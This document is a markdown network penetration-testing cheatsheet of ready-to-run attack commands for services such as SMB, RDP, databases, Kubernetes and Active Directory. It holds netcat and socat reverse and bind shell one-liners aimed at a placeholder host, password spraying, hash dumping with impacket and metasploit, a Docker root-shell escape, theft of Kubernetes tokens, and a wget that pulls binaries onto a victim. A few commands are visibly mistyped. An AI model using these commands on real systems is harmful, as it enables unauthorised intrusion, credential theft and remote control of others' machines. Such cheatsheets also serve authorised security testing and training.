# Network pentesting cheatsheet

## Summary
* [Network services](#network-services)
  * [FTP](#ftp)
  * [Netcat](#netcat)
  * [NFS](#nfs)
  * [RDP](#rdp)
  * [Redis](#redis)
  * [Rsync](#rsync)
  * [SMB](#smb)
  * [SMTP](#smtp)
  * [POP3](#pop3)
  * [Socat](#socat)
  * [SSH](#ssh)
  * [SCP](#scp)
  * [TCPDump](#tcpdump)
  * [Telnet](#telnet)
  * [Docker](#docker)
  * [Borg](#borg)
  * [Memcached](#memcached)
  * [Mysql](#mysql)
  * [Mongodb](#mongodb)
  * [Postgresql](#postgresql)
  * [MQTT](#mqtt)
  * [Kubernetes](#kubernetes)
* [Network exploitation & enumeration](#network-exploitation--enumeration)
  * [Port enumeration](#port-enumeration)
  * [Network pivoting](#network-pivoting)
  * [Exploiting Active Directory](#exploiting-active-directory)
  * [DNS enumeration](#dns-enumeration)

## Network services

### FTP
#### https://www.cs.colostate.edu/helpdocs/ftp.html

Connect to the service
```
ftp anonymous@10.0.0.1
ftp anonymous@10.0.0.1 -p 21
```
```
SITE CPFR <file_path>
SITE CPTO <file_dest>
```

### Netcat
#### https://www.varonis.com/blog/netcat-commands

Set up a listener
```
nc -lvnp 4444
nc -e /bin/bash -lvnp 4444 --ssl
nc -e cmd.exe -lvnp 4444 --ssl
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 /tmp/f
```
To connect to a listening service
```
nc -e /bin/bash 10.0.0.1 4444 --ssl
nc -e cmd.exe 10.0.0.1 4444 --ssl
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 /tmp/f
mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Send & receive files with netcat
```
nc -lvnp 4444 <file_name>
nc -nv 10.0.0.1 4444 < <file_name>
```

### NFS
#### Export shares on target's server
Create a directory for the exported files
```
mkdir /tmp/mount
```
List the NFS shares on the target's server
```
/usr/sbin/showmount -e 10.0.0.1
```
Connect NFS share to mount point
```
mount -t nfs 10.0.0.1:share_name /tmp/mount/ -nolock
```

### RDP
Enumerate rdp port & service
```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.0.0.1
```
Password spraying
```
crowbar -b rdp -s 10.0.0.1/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' rdp://10.0.0.1
```
Check known credentials on RDP
```
rdp_check domain.com/admin:password123@10.0.0.1
```
Connect with known credentials or hash
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.0.0.1 /u:admin /p:'password123'
rdesktop -u admin 10.0.0.1
rdesktop -d <domain-u <username-p password123 10.0.0.1
xfreerdp [/d:domain] /u:<username/p:password123 /v:10.0.0.1
xfreerdp [/d:domain] /u:<username/pth:<hash> /v:10.0.0.1
```

### Redis
Connect to Redis service
```
redis-cli -h 10.0.0.1 -a "password123"
netcat 10.0.0.1 4444
```
Commands for Redis server
```
KEYS * - to list all available shares
KEYS "[share's name]"
get "[share's name]"
LRANGE "[share's name]" 1 100
```

### Rsync
List files in Rsync server
```
rsync --list-only rsync://rsync-connect@10.0.0.1
```
Copy files onto local machine
```
rsync -zvh <file_name> [/local/path]
```
Copy all files onto local machine
```
rysnc -avzh [/remote/path] [/local/path]
```
Sync local file to rsync server
```
rsync [file] rsync://rsync-connect@10.0.0.1/path/
```

### SMB
Enumerate SMB
```
enum4linux -a 10.0.0.1
smbclient -L 10.0.0.1
nmap 10.0.0.1 -p139,445 --script=smb-vuln*
crackmapexec smb 10.0.0.1 -u username -p password --shares
```
Access resources on SMB server
```
smbclient //10.0.0.1/[share]
```

### SMTP
Connect to SMTP server
```
nc 10.0.0.1 25
```
Commands for SMTP server
```
VRFY admin - verify if the user exists
HELO | EHLO - initiate a conversation
STARTTLS - start a TLS session for encryption
RCPT - recipient address
DATA - message's content
RSET - abort current message
MAIL - sender address
QUIT - close connection
HELP - help screen
AUTH - authenticate client to server
```
Enumerate SMTP server
```
smtp-user-enum -M VRFY -U [userlist] -t [target-ip]
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
```

### POP3
Connect to POP3 mail server
```
nc 10.0.0.1 110
USER admin
PASS password123
```
Enumerate pop3 login auth with metasploit
```
use auxiliary/scanner/pop3/pop3_login
```
Commands for POP3 mail server
```
stat -returns total number of messages and total size
list -list all mesages
retr [message] -retrieves the whole message
dele [message] - deletes the specified message
top [message] -returns the headers and number of lines from the message
rset -undelete the message if any marked for deletion
quit -logs out and save any changes
```

### Socat
Set up a stabilised shell listener
```
socat TCP-L:4444 FILE:`tty`,raw,echo=0
```
Connect back to the stabilised listener
```
socat TCP:10.0.0.1:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
Set up a listener
```
socat TCP-L:4444 -
socat -d -d TCP4-LISTEN:4443 STDOUT
socat TCP-L:4444 EXEC:"bash -li"
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
socat TCP-L:4444 EXEC:powershell.exe,pipes
socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
```
Connect to a listening service
```
socat TCP:10.0.0.1:4444 EXEC:powershell.exe,pipes
socat TCP4:10.0.0.1:4443 EXEC:'cmd.exe',pipes
socat TCP:10.0.0.1:4444 EXEC:"bash -li"
socat TCP4:10.0.0.1:4443 EXEC:/bin/bash
socat TCP:10.0.0.1:4444 -
socat - TCP4:10.0.0.130:4443
```
#### Set up an encrypted reverse shell
Generate a certificate
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Merge the 2 created files into .pem extension
```
cat shell.key shell.crt shell.pem
```
Set up listener on local machine
```
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0
socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
```
Connect back to listener
```
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:/bin/bash [LINUX]
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:'cmd.exe',pipes [WINDOWS]
```
#### Set up an encrypted bind shell
Generate a certificate
```
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
```
Merge the 2 created files into pem file
```
cat bind.key bind.crt L bind.pem
```
Set up listener on victim machine
```
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes [WINDOWS]
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash [LINUX]
```
Connect back to listener
```
socat OPENSSL:10.0.0.1:4444,verify=0
socat - OPENSSL:10.0.0.130:4443,verify=0
```

### SSH
Connect to SSH service
```
ssh admin@10.0.0.1
ssh -p 4444 [username@10.0.0.1
ssh -i [key file] admin@10.0.0.1
ssh anonymous@10.0.0.1 -t 'bash --noprofile' -enables pseudo-tty allocation
```
Generate a ssh private key
```
ssh-keygen -f id_rsa
```
Port forwarding with ssh
```
ssh -L 4444:10.0.0.1:4444 [user]@10.0.0.1
```

### SCP
Transfer remote file to local machine
```
scp admin@10.0.0.1:<file_path> .
scp -P 4444 admin@10.0.0.1:<file_path> .
```
Transfer local file to remote machine
```
scp <file_name> admin@10.0.0.1:[path][file name to save]
scp -P 4444 <file_name> admin@10.0.0.1:[path][file name to save]
```

### TCPDump
```
tcpdump ip proto \\icmp -i tun0
tcpdump -i tun0 icmp
tcpdump port 80
tcpdump -i wlan0 -A
```

### Telnet
```
telnet 10.0.0.1 4444
```

### Docker
```
docker images - to see all docker images
docker run -v /:/mnt --rm -it image chroot /mnt sh {getting root shell}
```
Docker command on local machine after port forwarding
```
docker -H tcp://localhost:8080 images - list all docker images
docker -H tcp://localhost:8080 container ls - list all docker images
docker -H tcp://127.0.0.1:8080 exec -it [images] sh -- get shell on instances
```

### Borg
List all archives in the repository
```
--borg list [directory]
```
List the contents of archive
```
--borg list [directory::archive]
```
Extract archive into local machine
```
--borg extract [directory::archive]
```

### Memcached
Dumping all caches
```
/usr/share/memcached/scripts/memcached-tool ip:port dump
```

### Mysql
Connecting to the mysql service 
```
mysql -h 10.0.0.1 -u admin -p 
```
Commands for the sql server
```	
show databases;
use [db name];
show tables;
describe [tb name];
SELECT * FROM [tb name];
UPDATE [tb name] set [col name] = [value];
```
Get the mysql server version with metasploit
```
use auxiliary/admin/mysql/mysql_sql
```
Dump tables and columns in database with metasploit
```
use auxiliary/scanner/mysql/mysql_schemadump
```
Extract credentials from mysql server with metasploit
```
use auxiliary/scanner/mysql/mysql_hashdump
```
Enumerate mysql server with nmap
```
nmap -p3306 --script mysql-enum
```

### Mongodb
Connecting to the mongodb service
```
mongo 10.0.0.1 -u admin -p
```
Commands for MongoDB server
```
show dbs
use [db]
show collections
db.[collection].find()
```

### Postgresql
Enumerate login credentials with metasploit
```
auxiliary/scanner/postgres/postgres_login
```
Execute commands on sql server with metasploit
```
auxiliary/admin/postgres/postgres_sql
```
Dump user hash with metasploit
```
auxiliary/scanner/postgres/postgres_hashdump
```
Read files on sql server with authenticate credentials using metasploit
```
auxiliary/admin/postgres/postgres_readfile
```
Arbitrary comman execution with metasploit
```
exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

### MQTT
#### MQTT is a protocol mainly used by IOT devices
Subscribe to a topic
```
mosquitto_sub -t 'topic-name/#' -h ip -p 1883 -V mqttv31 --tls-version tlsv1.2
```
Listens to all published models except "$SYS"
```
mosquitto_sub -h ip -p 1883 -t "#"
```
Listens to "$SYS" published models
```
mosquitto_sub -h ip -p 1883 -t "$SYS"
```

### Kubernetes
Kubernetes service accounts path
```
/var/run/secrets/kubernetes.io/serviceaccount/{ca.crt, token, namespace}
```
Listing the pods on Kubernetes
```
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.0.0.1:8443/ get pods
```
Check privilege of current service account
```
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.0.0.1:8443/ auth can-i --list
```
Listing resources
```
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.0.0.1:8443/ get secrets
```
Read resources
```
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.0.0.1:8443/ get [resource] [name] -o yaml
```

## Network exploitation & enumeration

### Port Enumeration
#### https://nmap.org/nsedoc/scripts/
```
nmap -p- -A --min-rate 10000 -oN [save file] 10.0.0.1
rustscan -u 5000 -a 'machine-ip' -- -sC -sV
rustscan -u 5000 -b 2250 -t 2000 -a 'ip' -- -A -oN scan.txt
nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.0.0.1
nmap --script firewall-bypass <target>
nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp",firewall-bypass.targetport=21 <target>
nmap -n -sV --script="ldap* and not brute" -p 389 127.0.0.1 
nmap 10.0.0.1 -p139,445 --script=smb-vuln*
nmap --script=vuln -p 80 10.0.0.1
```

### Network pivoting
#### https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
Basic server listener (to pivot into the network behind it) using chisel
```
chisel server -p 8000 --reverse (on local machine)
chisel client [local-ip]:8000 R:[port-to-forward]:[ip-to-forward]:[port-to-forward] (on remote machine)
```
Basic client listener (unable to connect to the internet on remote machine) using chisel
```
chisel server -p 8000 (on local machine)
chisel client [local-ip]:8000 9001:www.exploit-db.com:443 (on remote machine)
```
Port forwarding with ssh
```
ssh -L 4444:10.0.0.1:4444 [user]@10.0.0.1
```
Port forwarding with socat
```
wget http://10.0.0.1:4444/socat --on victim to get socat binaries from local machine
chmod +x socat
./socat tcp-listen:[any port],reuseaddr,fork tcp:[ip to forward]:[port to forward]
```

### Exploiting Active Directory
#### https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
#### https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
Enumerate users on active directory
```
kerbrute userenum -d domain.com rockyou.txt
kerbrute passwordspray -d domain.com users.txt Password123
kerbrute bruteuser -d domain.com rockyou.txt user1
impacket-lookupsid domain.com/guest@10.0.0.1
impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.0.0.1 example.com/
```
RPCClient for active directory enumeration
```
rpcclient -U "" [target ip] --connect to rpcclient
querydominfo --domain information query
srvinfo --server information
enumdomusers --enumerate users
enumdomgroupd --enumerate groups
querygroup 0x200 --group queries
queryuser username --user queries
enumprivs --enumerate privileges
getdompwinfo --get domain password information
getusrdompwinfo 0x200 --get user domain password information
createdomuser username --create domain user
setuserinfo2 username 24 password --set a password for domain user
deletedomuser username --delete domain user
enumalsgroups builtin --enumerate alias groups
```
Windows remoting with AD users using crackmapexec
```
crackmapexec winrm 10.0.0.1 -u username -p password
```
Get a shell on the machine with AD users
```
impacket-psexec domain.com/username@10.0.0.1
impacket-wmiexec domain.com/username@10.0.0.1
evil-winrm -i 10.0.0.1 -u username -p password
evil-winrm -i 10.0.0.1 -u administrator -H "hash"                           1 ⨯
impacket-wmiexec domain.com/admin@10.0.0.1 -hashes [hash]
```
Dump hashes on AD machine
```
impacket-secretsdump domain.com/username@10.0.0.1
```

### DNS enumeration
Types of DNS records
```
A --stores a hostname & its ipv4 address
AAAA --stores a hostname & its ipv6 address
CNAME --stores a hostname that points to another hostname
MX --an SMTP email server
```
Sending DNS queries with NSLOOKUP
```
nslookup --type=A example.com 10.0.0.1
```
Sending DNS queries with DIG
```
dig @10.0.0.1 example.com A
```
Sending DNS queries with DNSRECON
```
dnsrecon -d example.com -n 10.0.0.1
```
DNS zone transfer
```
dig axfr example.com @example.com
```
Perform reverse IP lookup
```
dig -x 10.0.0.1
host 10.0.0.1
dig +noall +answer -x 10.0.0.1 --for cleaner output
nslookup 10.0.0.1
```
